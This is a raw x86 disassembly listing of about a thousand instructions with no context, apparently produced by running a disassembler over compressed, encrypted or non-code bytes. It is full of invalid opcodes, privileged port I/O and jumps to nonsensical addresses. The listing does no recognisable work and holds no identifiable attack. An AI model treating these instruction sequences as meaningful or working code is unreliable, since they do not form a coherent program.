  403892:	mov    ds:0xa508636b,eax
  403897:	fadd   QWORD PTR fs:[ebp+eiz*2+0x4d]
  40389c:	mov    al,ds:0x62625fdd
  4038a1:	fstp   QWORD PTR [edi+0x62]
  4038a4:	bound  ebx,QWORD PTR [edi+0x6f]
  4038a7:	mov    ebp,0x36a1ed64
  4038ac:	xchg   ecx,eax
  4038ad:	imul   ebp,eax,0x6b
  4038b0:	push   ss
  4038b1:	inc    ebp
  4038b2:	mov    esp,edx
  4038b4:	clc    
  4038b5:	mov    ch,0xdf
  4038b7:	push   eax
  4038b8:	arpl   WORD PTR [edx+0x49],ax
  4038bb:	pop    ebp
  4038bc:	popf   
  4038bd:	xchg   ebx,eax
  4038be:	inc    ecx
  4038bf:	dec    edi
  4038c0:	test   al,0x24
  4038c2:	es dec ebx
  4038c4:	push   ebx
  4038c5:	xor    al,0xf7
  4038c7:	jo     0x403881
  4038c9:	ret    0xc5c6
  4038cc:	fisubr DWORD PTR [ebx+0x6ba958fd]
  4038d3:	ja     0x4038bd
  4038d5:	shl    DWORD PTR [eax],cl
  4038d7:	imul   ecx,DWORD PTR [ebx],0xdf192373
  4038dd:	dec    edi
  4038de:	(bad)  
  4038df:	out    dx,al
  4038e0:	cs jmp 0x807b0cc6
  4038e6:	xor    ecx,eax
  4038e8:	jne    0x403925
  4038ea:	and    esp,DWORD PTR [edi-0x1d]
  4038ed:	jmp    0x697:0x61afcf37
  4038f4:	test   eax,0x877193e8
  4038f9:	dec    edi
  4038fa:	or     al,dh
  4038fc:	out    0x4c,al
  4038fe:	xchg   edi,eax
  4038ff:	in     eax,0x2
  403901:	lods   eax,DWORD PTR ds:[esi]
  403902:	mov    ds:0xa62bae07,eax
  403907:	dec    edx
  403908:	mov    ds:0x9c60a9ae,al
  40390d:	jp     0x403954
  40390f:	pop    ds
  403910:	pop    ecx
  403911:	jb     0x403913
  403913:	test   bl,bl
  403915:	int3   
  403916:	daa    
  403917:	and    eax,0xa50f811a
  40391c:	jns    0x403956
  40391e:	cli    
  40391f:	add    ebx,0xbd198567
  403925:	das    
  403926:	pop    ds
  403927:	pop    ss
  403928:	inc    ebx
  403929:	lods   eax,DWORD PTR ds:[esi]
  40392a:	push   ds
  40392b:	jmp    0xf7687e2b
  403930:	push   ds
  403931:	stos   DWORD PTR es:[edi],eax
  403932:	add    ebx,edx
  403934:	enter  0xd701,0xfe
  403938:	div    DWORD PTR [ebp-0x57fd0825]
  40393e:	cmp    DWORD PTR [esi-0x4bdeca6d],ebp
  403944:	xor    al,0x3c
  403946:	sub    eax,0xc6190fe2
  40394b:	test   bl,ch
  40394d:	leave  
  40394e:	sbb    ecx,eax
  403950:	loope  0x403959
  403952:	xchg   ebx,eax
  403953:	inc    esp
  403954:	cmp    DWORD PTR [ecx],ebx
  403956:	sub    al,0x83
  403958:	mov    edx,0x9c5a8a2e
  40395d:	and    al,0x3e
  40395f:	nop
  403960:	lds    ebp,FWORD PTR [esi]
  403962:	sbb    bh,BYTE PTR [edi]
  403964:	in     eax,dx
  403965:	sub    ecx,edi
  403967:	repnz std 
  403969:	xchg   esp,eax
  40396a:	shl    BYTE PTR [eax-0x7f],1
  40396d:	fld    st(4)
  40396f:	out    0xc7,eax
  403971:	test   DWORD PTR [edx-0x34],ebx
  403974:	jnp    0x403950
  403976:	jne    0x4039c1
  403978:	lea    esp,[ebx-0xf]
  40397b:	push   edx
  40397c:	xchg   ebx,eax
  40397d:	and    ch,BYTE PTR [eax+0x77]
  403980:	adc    al,0x38
  403982:	push   edx
  403983:	(bad)  
  403984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403985:	sbb    ebp,ebp
  403987:	(bad)  
  403988:	xor    al,0xaf
  40398a:	popa   
  40398b:	xchg   edx,eax
  40398c:	xor    dl,BYTE PTR [esi+ecx*1]
  40398f:	cmp    al,0x73
  403991:	sub    DWORD PTR [ecx],ecx
  403993:	jne    0x403971
  403995:	xor    DWORD PTR [esi-0x65ee0b2d],ebx
  40399b:	ret    
  40399c:	pushf  
  40399d:	stos   BYTE PTR es:[edi],al
  40399e:	ret    
  40399f:	sti    
  4039a0:	into   
  4039a1:	adc    al,0xe0
  4039a3:	mov    ds:0xf53354e8,eax
  4039a8:	mov    ds:0xd8d56200,al
  4039ad:	xor    edi,eax
  4039af:	lods   eax,DWORD PTR ds:[esi]
  4039b0:	push   eax
  4039b1:	cmp    al,0x32
  4039b3:	popa   
  4039b4:	push   0xffffff81
  4039b6:	outs   dx,DWORD PTR ds:[esi]
  4039b7:	or     eax,0x7917376b
  4039bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039bd:	pop    ss
  4039be:	jle    0x403952
  4039c0:	iret   
  4039c1:	dec    ebx
  4039c2:	mov    al,ds:0x9bab78a6
  4039c7:	out    dx,eax
  4039c8:	pusha  
  4039c9:	cmp    DWORD PTR [esp+esi*4+0x6cf6ff6b],eax
  4039d0:	fild   WORD PTR [ecx-0x3a]
  4039d3:	mov    esi,0x5089ab3c
  4039d8:	pop    ds
  4039d9:	adc    eax,0xc907ff66
  4039de:	push   0xa0d45b86
  4039e3:	add    BYTE PTR [eax+0xd000507],cl
  4039e9:	mov    BYTE PTR [ecx-0x47],ch
  4039ec:	jb     0x403a10
  4039ee:	add    BYTE PTR [esi+edi*8+0x1e79ca99],dh
  4039f5:	sub    dh,BYTE PTR [edi*8+0x4805afde]
  4039fc:	mov    bh,0xc0
  4039fe:	leave  
  4039ff:	pop    ds
  403a00:	aam    0xd7
  403a02:	(bad)
  403a05:	int3   
  403a06:	bound  edi,QWORD PTR [ecx+0xd]
  403a09:	lods   al,BYTE PTR ds:[esi]
  403a0a:	(bad)  
  403a0b:	hlt    
  403a0c:	std    
  403a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a0e:	mov    edx,0x69adccd0
  403a13:	sti    
  403a14:	inc    ebp
  403a15:	ror    BYTE PTR [edx+0xddebfe3],cl
  403a1b:	sbb    BYTE PTR [edi+0x22],ch
  403a1e:	ja     0x403a82
  403a20:	imul   ebp,DWORD PTR [edi-0x658deb1f],0x5fcf1114
  403a2a:	es stos DWORD PTR es:[edi],eax
  403a2c:	gs pushf 
  403a2e:	and    ah,BYTE PTR ds:[eax+ebp*4]
  403a32:	jae    0x4039b6
  403a34:	sub    DWORD PTR [esi-0x2a],ebp
  403a37:	or     eax,0x614fecb2
  403a3c:	sbb    eax,0x8d7310e0
  403a41:	or     al,0xba
  403a43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a44:	cmc    
  403a45:	fnstcw WORD PTR [eax+ebp*2]
  403a48:	jecxz  0x403a3e
  403a4a:	pushf  
  403a4b:	mov    bl,0xb7
  403a4d:	ins    DWORD PTR es:[edi],dx
  403a4e:	pop    ds
  403a4f:	sbb    al,BYTE PTR [ebp+edx*4+0x31a9c7e3]
  403a56:	mov    cl,0xcc
  403a58:	jmp    0x977726eb
  403a5d:	dec    ebx
  403a5e:	sbb    ecx,DWORD PTR ds:0xedc5e223
  403a64:	dec    ecx
  403a65:	jae    0x403a4f
  403a67:	loope  0x403aa6
  403a69:	pusha  
  403a6a:	dec    eax
  403a6b:	(bad)  
  403a6c:	aad    0xd6
  403a6e:	dec    ecx
  403a6f:	push   es
  403a70:	sti    
  403a71:	addr16 je 0x403a45
  403a74:	in     eax,0xea
  403a76:	out    0xf8,al
  403a78:	dec    edx
  403a79:	dec    edi
  403a7a:	or     esi,0xdbdf850f
  403a80:	sub    DWORD PTR [edx+0x20baaefb],esp
  403a86:	retf   
  403a87:	mov    edi,0x7b05d3d8
  403a8c:	cwde   
  403a8d:	mov    bl,0x7f
  403a8f:	mov    ds,esp
  403a91:	xchg   ebp,eax
  403a92:	mov    esp,0x9f264fd2
  403a97:	(bad)  
  403a98:	xlat   BYTE PTR ds:[ebx]
  403a99:	outs   dx,DWORD PTR ds:[esi]
  403a9a:	mov    ebp,0x914df250
  403a9f:	mov    ds:0x91a795f9,al
  403aa4:	and    BYTE PTR [eax-0x6a],bh
  403aa7:	mov    al,ds:0xa5feb904
  403aac:	fs mov esi,0x32aaa9c1
  403ab2:	lea    eax,[edx]
  403ab4:	mul    edi
  403ab6:	inc    edi
  403ab7:	mov    eax,DWORD PTR [esi]
  403ab9:	pop    ds
  403aba:	fsub   DWORD PTR [edx-0x76d15044]
  403ac0:	dec    esi
  403ac1:	sub    DWORD PTR [ebp+edi*8-0xc],ecx
  403ac5:	ins    BYTE PTR es:[edi],dx
  403ac6:	cdq    
  403ac7:	test   DWORD PTR [esi+0x30],ebx
  403aca:	or     al,ch
  403acc:	or     al,0xb3
  403ace:	rep outs dx,BYTE PTR ds:[esi]
  403ad0:	mov    ds:0x1bfdb47c,al
  403ad5:	xchg   ebx,eax
  403ad6:	das    
  403ad7:	test   eax,0xa5857176
  403adc:	rol    BYTE PTR [ecx-0x61],cl
  403adf:	ins    DWORD PTR es:[edi],dx
  403ae0:	mov    ah,0x6b
  403ae2:	in     eax,dx
  403ae3:	mov    ecx,0x70b40224
  403ae8:	test   bh,ah
  403aea:	ficom  DWORD PTR [esi-0x76]
  403aed:	cmp    al,0xff
  403aef:	imul   ecx,DWORD PTR [eax+0x5f],0xb13aaf76
  403af6:	adc    edi,DWORD PTR [eax]
  403af8:	jp     0x403b3c
  403afa:	lods   eax,DWORD PTR ds:[esi]
  403afb:	mov    ah,0x9
  403afd:	dec    edi
  403afe:	add    BYTE PTR [edi+edx*4-0x3a9a4772],ah
  403b05:	fisubr WORD PTR [ebx+0x29]
  403b08:	lahf   
  403b09:	mov    eax,ds:0xcca3e015
  403b0e:	inc    edi
  403b0f:	hlt    
  403b10:	sub    al,0x85
  403b12:	sub    esi,ecx
  403b14:	push   0xffffffde
  403b16:	test   eax,0x9106b510
  403b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b1d:	fld    QWORD PTR [eax]
  403b1f:	mov    esi,0x881f9900
  403b24:	xor    ecx,eax
  403b26:	push   esi
  403b27:	add    esi,esi
  403b29:	popa   
  403b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b2b:	lds    esi,FWORD PTR [esp+esi*8-0x6a714c7e]
  403b32:	push   eax
  403b33:	or     al,dh
  403b35:	cmp    bh,BYTE PTR [esi+0x35056a2c]
  403b3b:	jp     0x403b22
  403b3d:	sahf   
  403b3e:	jmp    0x69fd:0xaa8c2002
  403b45:	sub    edi,DWORD PTR [eax+eax*1-0x38a3bf6b]
  403b4c:	test   WORD PTR [edi+0x6fb42b8d],dx
  403b53:	stos   DWORD PTR es:[edi],eax
  403b54:	fist   DWORD PTR [esi-0x705bf5f4]
  403b5a:	lahf   
  403b5b:	pop    eax
  403b5c:	or     al,0x62
  403b5e:	(bad)  
  403b5f:	pop    ss
  403b60:	ds clc 
  403b62:	push   ds
  403b63:	fidiv  WORD PTR [edi]
  403b65:	dec    esi
  403b66:	shl    BYTE PTR [ecx-0x603dd9bf],0x9e
  403b6d:	mov    eax,0xe8d811f2
  403b72:	ror    BYTE PTR [eax-0x1f80adba],0x22
  403b79:	and    BYTE PTR [ecx],bh
  403b7b:	fcom   DWORD PTR [ebp-0xc]
  403b7e:	xor    BYTE PTR [esi+eiz*4+0x4a],0xbe
  403b83:	icebp  
  403b84:	jmp    DWORD PTR [edi+edi*8]
  403b87:	hlt    
  403b88:	fstp   st(6)
  403b8a:	sbb    edx,DWORD PTR [edx]
  403b8c:	xchg   esp,eax
  403b8d:	rol    dh,1
  403b8f:	lods   al,BYTE PTR ds:[esi]
  403b90:	leave  
  403b91:	mov    dh,0xc7
  403b93:	pcmpeqb mm0,QWORD PTR [edi]
  403b96:	cmp    bh,cl
  403b98:	out    0x4b,al
  403b9a:	cli    
  403b9b:	mov    esi,0x8a5f2e1a
  403ba0:	ficomp WORD PTR [edx-0x1ec128a4]
  403ba6:	iret   
  403ba7:	jae    0x403be1
  403ba9:	add    eax,esi
  403bab:	icebp  
  403bac:	mov    ebx,0x89a9cd17
  403bb1:	cdq    
  403bb2:	xor    ch,cl
  403bb4:	je     0x403c13
  403bb6:	pop    ebp
  403bb7:	sbb    eax,0xae002eb5
  403bbc:	pop    ebx
  403bbd:	adc    ebx,eax
  403bbf:	popa   
  403bc0:	jl     0x403ba0
  403bc2:	xchg   ebx,eax
  403bc3:	dec    esp
  403bc4:	pop    esp
  403bc5:	outs   dx,DWORD PTR ds:[esi]
  403bc6:	sbb    BYTE PTR [esi],0x4a
  403bc9:	push   edi
  403bca:	adc    ch,dl
  403bcc:	test   BYTE PTR [edx+0x772c1881],ah
  403bd2:	aad    0xa2
  403bd4:	dec    edx
  403bd5:	out    0x85,eax
  403bd7:	mov    bl,0xee
  403bd9:	mov    edx,DWORD PTR [eax-0x63]
  403bdc:	jg     0x403b79
  403bde:	(bad)  
  403bdf:	(bad)  
  403be0:	push   esp
  403be1:	xor    al,0x8c
  403be3:	add    DWORD PTR [eax],ebx
  403be5:	mov    ds:0xd890afe,eax
  403bea:	inc    ecx
  403beb:	pop    esp
  403bec:	mov    edx,0xaea97ab4
  403bf1:	dec    eax
  403bf2:	ins    DWORD PTR es:[edi],dx
  403bf3:	arpl   sp,ax
  403bf5:	sbb    BYTE PTR [eax],dh
  403bf7:	jbe    0x403be0
  403bf9:	mov    DWORD PTR [ebx-0x2d],edi
  403bfc:	pop    ebx
  403bfd:	mov    ds:0xbe9631e2,eax
  403c02:	dec    esi
  403c03:	retf   
  403c04:	xchg   eax,edx
  403c06:	xor    eax,0xdc6197d5
  403c0b:	or     eax,DWORD PTR [esi+0x62]
  403c0e:	add    BYTE PTR [eax-0x2a],dh
  403c11:	mov    dl,BYTE PTR [edx+0x6d08550e]
  403c17:	inc    esp
  403c18:	fnstenv [eax+0x46]
  403c1b:	ja     0x403bbe
  403c1d:	call   0x7ea526ce
  403c22:	push   cs
  403c23:	sbb    eax,ecx
  403c25:	retf   
  403c26:	mov    al,ds:0xa5286a41
  403c2b:	adc    bh,BYTE PTR [edx]
  403c2d:	or     eax,DWORD PTR [eax]
  403c2f:	mov    edx,0x8130a7a6
  403c34:	pop    edi
  403c35:	aas    
  403c36:	add    edi,DWORD PTR es:[eax+0x26e3beca]
  403c3d:	mov    al,0x85
  403c3f:	je     0x403bce
  403c41:	pop    eax
  403c42:	push   edi
  403c43:	xchg   ebx,eax
  403c44:	imul   eax,DWORD PTR [edx+0x44],0x8
  403c48:	push   0xffffffef
  403c4a:	mov    eax,0xbf263e66
  403c4f:	adc    dl,ah
  403c51:	mov    ebp,0x645ac4ae
  403c56:	cdq    
  403c57:	xchg   ebp,eax
  403c58:	test   ebx,esi
  403c5a:	jbe    0x403c59
  403c5c:	xchg   BYTE PTR [ebx+0x62],cl
  403c5f:	jb     0x403c8f
  403c61:	test   al,0xcf
  403c63:	je     0x403c4d
  403c65:	xchg   ebp,eax
  403c66:	mov    al,0x39
  403c68:	adc    eax,0x49847109
  403c6d:	pusha  
  403c6e:	lahf   
  403c6f:	cli    
  403c70:	xchg   ebp,eax
  403c71:	pop    esp
  403c72:	adc    DWORD PTR [ebp-0x4d],ecx
  403c75:	jbe    0x403c4b
  403c77:	cmc    
  403c78:	leave  
  403c79:	repnz or BYTE PTR [edx+edi*1-0xa],bh
  403c7e:	clc    
  403c7f:	inc    edi
  403c80:	or     eax,0x97771e38
  403c85:	int3   
  403c86:	mov    BYTE PTR [ecx-0x6819a728],ah
  403c8c:	jo     0x403cec
  403c8e:	push   0x51494025
  403c93:	repnz aas 
  403c95:	push   esi
  403c96:	in     al,dx
  403c97:	jne    0x403cff
  403c99:	push   eax
  403c9a:	fstp   QWORD PTR [edi+0x63]
  403c9d:	jg     0x403d1b
  403c9f:	push   esp
  403ca0:	cwde   
  403ca1:	addr16 dec edx
  403ca3:	outs   dx,DWORD PTR gs:[esi]
  403ca5:	lock out dx,eax
  403ca7:	pop    edx
  403ca8:	(bad)  
  403ca9:	xor    DWORD PTR [esi-0x19e27cfe],ebx
  403caf:	adc    dh,bl
  403cb1:	mov    bl,0xf7
  403cb3:	and    dh,BYTE PTR [ecx-0x52302510]
  403cb9:	push   edx
  403cba:	push   cs
  403cbb:	pop    esp
  403cbc:	fidivr DWORD PTR [ecx+0x6162bba1]
  403cc2:	addr16 ja 0x403cd1
  403cc5:	sub    al,0x61
  403cc7:	dec    eax
  403cc8:	shr    bh,1
  403cca:	sub    cl,ch
  403ccc:	sub    BYTE PTR [ebp-0x183522d2],al
  403cd2:	outs   dx,BYTE PTR ds:[esi]
  403cd3:	scas   eax,DWORD PTR es:[edi]
  403cd4:	jmp    0xdcf350a6
  403cd9:	ret    
  403cda:	aad    0x43
  403cdc:	mov    BYTE PTR [ecx],dh
  403cde:	sar    DWORD PTR [esp+edi*4-0x4cde01f2],1
  403ce5:	fisubr WORD PTR [ebx-0x29]
  403ce8:	cmp    ebx,0x87d9d155
  403cee:	pushf  
  403cef:	aaa    
  403cf0:	dec    ebp
  403cf1:	nop
  403cf2:	sbb    eax,0x408132c1
  403cf7:	mov    edx,0x7da78753
  403cfc:	sahf   
  403cfd:	sub    dl,BYTE PTR [ebx]
  403cff:	xchg   ecx,eax
  403d00:	mov    dh,0xef
  403d02:	fwait
  403d03:	daa    
  403d04:	pop    es
  403d05:	jno    0x403d02
  403d07:	push   edi
  403d08:	jp     0x403cba
  403d0a:	and    eax,0x751aa743
  403d0f:	fs faddp st(3),st
  403d12:	popa   
  403d13:	cmp    BYTE PTR [edx-0x48],dh
  403d16:	jbe    0x403d74
  403d18:	sub    al,0xa0
  403d1a:	add    ebx,0xffffff8e
  403d1d:	icebp  
  403d1e:	int    0x76
  403d20:	inc    edi
  403d21:	out    dx,eax
  403d22:	push   ds
  403d23:	adc    BYTE PTR [esi+0x3628af8c],al
  403d29:	rcl    BYTE PTR [ecx],1
  403d2b:	mov    edx,0x7d0b3198
  403d30:	mov    ch,0x3c
  403d32:	ins    BYTE PTR es:[edi],dx
  403d33:	and    DWORD PTR [ebx],ebp
  403d35:	push   cs
  403d36:	sbb    dh,BYTE PTR [edx+0x11]
  403d39:	push   eax
  403d3a:	shl    DWORD PTR [edi-0x7ce66e4c],cl
  403d40:	jnp    0x403d0f
  403d42:	push   cs
  403d43:	dec    eax
  403d44:	call   0xfe099998
  403d49:	repnz nop
  403d4b:	sbb    bl,BYTE PTR [esp+ecx*8]
  403d4e:	lods   eax,DWORD PTR ds:[esi]
  403d4f:	mov    edi,0xb0bf9d24
  403d54:	push   eax
  403d55:	xor    esp,edx
  403d57:	in     eax,dx
  403d58:	dec    esp
  403d59:	push   es
  403d5a:	mov    cl,0xc2
  403d5c:	mov    dh,0x4a
  403d5e:	pop    es
  403d5f:	push   ecx
  403d60:	lahf   
  403d61:	out    0x15,al
  403d63:	jns    0x403cf5
  403d65:	call   FWORD PTR [ecx+ebp*1-0x7630c417]
  403d6c:	fldenv [esi-0x53481e0c]
  403d72:	dec    ebx
  403d73:	sbb    edi,0x41
  403d76:	mov    al,ds:0x86000b22
  403d7b:	pop    ds
  403d7c:	sbb    esp,edi
  403d7e:	in     al,0xaf
  403d80:	aad    0x6a
  403d82:	mov    ?,WORD PTR [ecx]
  403d84:	fbstp  TBYTE PTR [ebx-0x65]
  403d87:	dec    edi
  403d88:	in     eax,0x5a
  403d8a:	sti    
  403d8b:	mov    bh,al
  403d8d:	sbb    al,0xe
  403d8f:	mov    al,0x43
  403d91:	adc    al,0xe9
  403d93:	js     0x403d40
  403d95:	sub    ebp,DWORD PTR [eax-0x4f704a2a]
  403d9b:	add    eax,0xbf5f30ed
  403da0:	stos   BYTE PTR es:[edi],al
  403da1:	pop    edi
  403da2:	or     al,0x30
  403da4:	sub    bl,ah
  403da6:	loop   0x403df1
  403da8:	xchg   esi,eax
  403da9:	xchg   ah,dh
  403dab:	mov    eax,0x25545186
  403db0:	cs popa 
  403db2:	jmp    0x4394fd4b
  403db7:	cwde   
  403db8:	ss jmp 0x6321:0x50c3f478
  403dc0:	(bad)  
  403dc1:	xor    eax,0x8d07d490
  403dc6:	mov    esi,0xec8fce3a
  403dcb:	lahf   
  403dcc:	dec    ebp
  403dcd:	jo     0x403e0d
  403dcf:	(bad)  
  403dd0:	jmp    0x40ef9460
  403dd5:	xor    dh,bh
  403dd7:	pushf  
  403dd8:	xchg   ebx,eax
  403dd9:	ror    BYTE PTR es:[edi+0x2996d091],0xe7
  403de1:	mov    esi,0xe7dff17b
  403de6:	lods   al,BYTE PTR ds:[esi]
  403de7:	enter  0xb25b,0xaf
  403deb:	loope  0x403df7
  403ded:	and    BYTE PTR [esp+edi*8-0x2d],0x1b
  403df2:	add    BYTE PTR [ebx+edi*8+0x69084419],ah
  403df9:	push   ss
  403dfa:	fst    QWORD PTR [ebp-0x3ef5f0ad]
  403e00:	sti    
  403e01:	test   al,0xbe
  403e03:	mov    al,0xab
  403e05:	and    BYTE PTR [edx-0x46251597],bl
  403e0b:	test   bl,0xc8
  403e0e:	and    ch,cl
  403e10:	cmp    al,0xdb
  403e12:	push   es
  403e13:	data16 jecxz 0x403df5
  403e16:	inc    edi
  403e17:	loope  0x403e5c
  403e19:	or     al,0x46
  403e1b:	jecxz  0x403dc9
  403e1d:	and    edi,DWORD PTR [edx+edi*2+0x2e409180]
  403e24:	sbb    eax,0x47a2b158
  403e29:	sbb    eax,0xf88f7cf9
  403e2e:	jno    0x403e00
  403e30:	outs   dx,DWORD PTR ds:[esi]
  403e31:	out    0x71,eax
  403e33:	push   ss
  403e34:	mov    BYTE PTR [ecx],dh
  403e36:	xchg   ch,bh
  403e38:	outs   dx,BYTE PTR ds:[esi]
  403e39:	sti    
  403e3a:	xor    BYTE PTR [esi],ah
  403e3c:	in     al,dx
  403e3d:	pop    ebp
  403e3e:	sub    DWORD PTR [esi+eiz*1],ecx
  403e41:	mov    cl,0xb9
  403e43:	fistp  QWORD PTR [esi-0x5770d6b]
  403e49:	ins    BYTE PTR es:[edi],dx
  403e4a:	or     al,0x91
  403e4c:	mov    bh,0xf3
  403e4e:	push   esp
  403e4f:	xor    ebx,DWORD PTR [ebp+0x78]
  403e52:	or     al,0x2d
  403e54:	aam    0xc4
  403e56:	xchg   ebp,eax
  403e57:	jg     0x403e43
  403e59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e5a:	test   DWORD PTR [esi-0x3a],esp
  403e5d:	mov    bh,0xf8
  403e5f:	mov    ecx,ebp
  403e61:	js     0x403e9e
  403e63:	push   esp
  403e64:	push   esi
  403e65:	ds sahf 
  403e67:	and    dh,BYTE PTR [edi+eax*4+0x6d9fd14b]
  403e6e:	fwait
  403e6f:	adc    dl,bh
  403e71:	inc    esi
  403e72:	jle    0x403e0b
  403e74:	dec    ebp
  403e75:	pop    edx
  403e76:	pop    eax
  403e77:	pushf  
  403e78:	pop    esi
  403e79:	and    bl,BYTE PTR [edi+ecx*2]
  403e7c:	pusha  
  403e7d:	xlat   BYTE PTR ds:[ebx]
  403e7e:	cwde   
  403e7f:	mov    DWORD PTR [esi-0x167d7e99],ebp
  403e85:	or     BYTE PTR [ebx+0x3c35ee1c],0xaf
  403e8c:	adc    ah,ah
  403e8e:	js     0x403e5c
  403e90:	rep outs dx,BYTE PTR ds:[esi]
  403e92:	lds    esp,FWORD PTR [eax+0x45f1cefd]
  403e98:	aaa    
  403e99:	cmp    cl,ch
  403e9b:	sti    
  403e9c:	test   ebx,0x8567288c
  403ea2:	add    DWORD PTR [esp+edx*1+0x133fe766],esp
  403ea9:	xchg   esp,eax
  403eaa:	das    
  403eab:	test   al,0xe4
  403ead:	(bad)  
  403eae:	outs   dx,DWORD PTR ds:[esi]
  403eaf:	mov    ebp,0x56a53745
  403eb4:	fcmovnu st,st(5)
  403eb6:	enter  0x3049,0x40
  403eba:	pop    ebp
  403ebb:	popa   
  403ebc:	adc    eax,0xd13b6999
  403ec1:	push   esi
  403ec2:	xchg   ebp,eax
  403ec3:	mov    esi,0xa0e3985e
  403ec8:	inc    esi
  403ec9:	sub    eax,0xd92528d8
  403ece:	lea    edx,[edi-0x4b]
  403ed1:	mov    esp,0x897cd196
  403ed6:	sbb    DWORD PTR [ebx+0x627776e4],edx
  403edc:	jge    0x403e99
  403ede:	mov    eax,0x4ede72d8
  403ee3:	icebp  
  403ee4:	adc    eax,0x7402ce52
  403ee9:	in     eax,dx
  403eea:	lahf   
  403eeb:	out    dx,al
  403eec:	sbb    DWORD PTR [esi],ebx
  403eee:	loop   0x403e76
  403ef0:	sub    bl,BYTE PTR [eax+0x3f]
  403ef3:	fs nop
  403ef5:	repz in al,dx
  403ef7:	icebp  
  403ef8:	inc    ecx
  403ef9:	ds mov edi,0x105a3f13
  403eff:	pop    ds
  403f00:	mov    cl,0xe1
  403f02:	stos   BYTE PTR es:[edi],al
  403f03:	and    edi,ecx
  403f05:	push   ebp
  403f06:	and    al,BYTE PTR [edi]
  403f08:	in     eax,0xe6
  403f0a:	je     0x403f1f
  403f0c:	add    BYTE PTR [ecx+ecx*2],dl
  403f0f:	xor    DWORD PTR [eax],eax
  403f11:	adc    eax,0xaef76785
  403f16:	jl     0x403f78
  403f18:	aaa    
  403f19:	dec    ebp
  403f1a:	add    bl,bh
  403f1c:	outs   dx,BYTE PTR ds:[esi]
  403f1d:	sub    al,0x91
  403f1f:	xchg   DWORD PTR [ecx+0x22ded7a9],esi
  403f25:	pop    edi
  403f26:	idiv   esi
  403f28:	into   
  403f29:	sub    BYTE PTR [esi+ebx*8-0x1e],0x9e
  403f2e:	add    eax,0xe337018b
  403f33:	cmp    al,0x61
  403f35:	sbb    dl,BYTE PTR [edi]
  403f37:	or     ah,al
  403f39:	or     DWORD PTR [eax+edx*4+0x66850747],eax
  403f40:	(bad)  
  403f41:	and    dl,dl
  403f43:	jmp    0x403f30
  403f45:	push   DWORD PTR [esi-0x5c]
  403f48:	mov    ebx,0xaaf2911e
  403f4d:	jge    0x403f6e
  403f4f:	shr    DWORD PTR [esi],1
  403f51:	dec    esi
  403f52:	dec    esi
  403f53:	aad    0x8c
  403f55:	fst    QWORD PTR [eax+0x4cf1d9d3]
  403f5b:	push   ebx
  403f5c:	test   al,0x66
  403f5e:	sub    bh,BYTE PTR ds:0xa490a24e
  403f64:	xor    al,0x85
  403f66:	mov    ?,WORD PTR [ebp-0x3f85a0df]
  403f6c:	dec    esp
  403f6d:	gs fcom st(3)
  403f70:	xchg   ebx,esp
  403f72:	xor    esi,edx
  403f74:	cmc    
  403f75:	and    eax,0xc32cf5c8
  403f7a:	sti    
  403f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f7c:	mov    dh,0xae
  403f7e:	leave  
  403f7f:	xchg   esi,eax
  403f80:	mov    ebx,0xad06823f
  403f85:	xchg   ecx,eax
  403f86:	cld    
  403f87:	lock arpl WORD PTR [eax+esi*1-0x5b],cx
  403f8c:	push   0x5c1ab28d
  403f91:	or     DWORD PTR [ebp-0x2a],eax
  403f94:	(bad)  
  403f95:	sub    ch,al
  403f97:	sbb    DWORD PTR [ebx],edx
  403f99:	aam    0x4
  403f9b:	adc    al,0x4b
  403f9d:	popa   
  403f9e:	mov    edx,0xa90fb500
  403fa3:	push   esp
  403fa4:	ins    DWORD PTR es:[edi],dx
  403fa5:	mov    edi,DWORD PTR [ebp-0x5a77e340]
  403fab:	cmp    al,BYTE PTR [ebx+0x64]
  403fae:	dec    ebp
  403faf:	pop    ds
  403fb0:	xor    ecx,edx
  403fb2:	ins    DWORD PTR es:[edi],dx
  403fb3:	loopne 0x403fdd
  403fb5:	mov    cl,BYTE PTR ds:0x90461493
  403fbb:	and    BYTE PTR [ecx+0x6f],al
  403fbe:	add    esi,DWORD PTR [edx-0x448451aa]
  403fc4:	(bad)  
  403fc5:	push   ebx
  403fc6:	shl    bl,0x14
  403fc9:	daa    
  403fca:	aam    0xc7
  403fcc:	inc    ecx
  403fcd:	aaa    
  403fce:	ficom  WORD PTR [edx]
  403fd0:	sub    bh,al
  403fd2:	sar    DWORD PTR [ecx+0x3b],0xd5
  403fd6:	scas   eax,DWORD PTR es:[edi]
  403fd7:	dec    eax
  403fd8:	and    BYTE PTR [ebx-0x75],bl
  403fdb:	add    ah,BYTE PTR [esi-0x28]
  403fde:	call   0x36cf:0x2b1
  403fe4:	or     al,0xf7
  403fe6:	pop    ebx
  403fe7:	xor    ah,BYTE PTR [ebx-0x79ad7fcf]
  403fed:	adc    DWORD PTR [ebp-0x7f2e7d4a],esi
  403ff3:	pop    es
  403ff4:	icebp  
  403ff5:	mov    bh,0x6f
  403ff7:	stc    
  403ff8:	mov    ch,0xc9
  403ffa:	ja     0x404050
  403ffc:	push   ds
  403ffd:	shr    bl,0x42
  404000:	mov    dl,ch
  404002:	outs   dx,DWORD PTR ds:[esi]
  404003:	xor    ecx,0xfffffff1
  404006:	sbb    al,BYTE PTR [ebp-0x75749031]
  40400c:	(bad)  
  40400e:	dec    ebx
  40400f:	scas   eax,DWORD PTR es:[edi]
  404010:	adc    ch,BYTE PTR [ebx]
  404012:	imul   edi
  404014:	dec    esi
  404015:	pop    ebp
  404016:	call   0x7d093f0
  40401b:	xor    al,0xb2
  40401d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40401e:	pop    es
  40401f:	jg     0x403fb3
  404021:	mov    dh,ah
  404023:	loopne 0x404012
  404025:	jo     0x403fe9
  404027:	lods   al,BYTE PTR ds:[esi]
  404028:	add    edi,DWORD PTR [edx-0x25]
  40402b:	repz or al,BYTE PTR [ecx]
  40402e:	imul   ecx,DWORD PTR [edx],0x939bfb59
  404034:	add    eax,0xf6ad87ea
  404039:	and    eax,DWORD PTR [ecx-0x1d]
